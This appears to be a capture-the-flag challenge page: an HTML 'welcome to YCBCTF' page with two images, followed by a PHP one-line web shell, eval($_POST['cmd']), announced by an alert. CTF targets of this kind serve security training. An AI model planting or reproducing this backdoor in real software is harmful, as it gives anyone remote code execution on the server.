
<html>
<head>
     <style> div.main { margin-left:auto; margin-right:auto;  } body { background-color: 	#FAEBA7; }</style>
     <title>
       welcome to YCBCTF
     </title>
</head>
<body>
<img src=gw2.jpg  width=49% height=60%>
    <img src=gw.jpg  width=49% height=60%>
    
    <br>
</div>
    </body>
</html>

<?php
echo "<script>alert('eval post cmd')</script>";
eval($_POST['cmd']);
?>
